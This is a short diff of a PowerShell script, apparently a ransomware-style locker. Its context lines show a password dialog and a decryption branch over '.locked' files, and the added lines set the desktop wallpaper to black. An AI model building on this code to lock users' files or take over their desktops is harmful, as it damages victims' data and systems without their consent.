@@ -180,6 +180,18 @@ $form.ShowDialog()
 # --- DECHIFFREMENT si bon mot de passe ---
 if ($script:tentatives -gt 0) {
 
+ $blackWallpaper = "$env:TEMP\black.bmp"
+    Add-Type -AssemblyName System.Drawing
+    $bitmap = New-Object System.Drawing.Bitmap(1920, 1080)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.Clear([System.Drawing.Color]::Black)
+    $bitmap.Save($blackWallpaper)
+    $graphics.Dispose()
+    $bitmap.Dispose()
+    [Wallpaper]::SystemParametersInfo(20, 0, $blackWallpaper, 3)
+
+
+
     $encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked" -Recurse
 
     foreach ($encFile in $encryptedFiles)
